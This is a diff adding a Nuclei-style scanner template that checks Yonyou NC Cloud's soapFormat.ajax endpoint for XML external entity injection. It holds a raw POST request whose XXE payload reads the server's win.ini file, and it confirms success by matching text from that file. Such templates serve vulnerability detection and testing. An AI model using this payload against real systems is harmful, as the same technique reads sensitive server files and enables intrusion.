@@ -1,0 +1,33 @@
+id: yongyou-NC-soapFormat-API-XXE
+info:
+  name: 用友NC Cloud soapFormat.ajax接口XXE
+  author: changge
+  severity: info
+  description: 用友NC Cloud soapFormat.ajax接口XXE
+  reference:
+    - https://
+  tags: tags
+
+http:
+  - raw:
+      - |
+        POST /uapws/soapFormat.ajax HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
+        Content-Length: 261
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Upgrade-Insecure-Requests: 1
+
+        msg=<!DOCTYPE foo[<!ENTITY xxe1two SYSTEM "file:///C://windows/win.ini"> ]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><soap:Fault><faultcode>soap:Server%26xxe1two%3b</faultcode></soap:Fault></soap:Body></soap:Envelope>%0a
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - for 16-bit app support
+      - type: status
+        status:
+          - 200
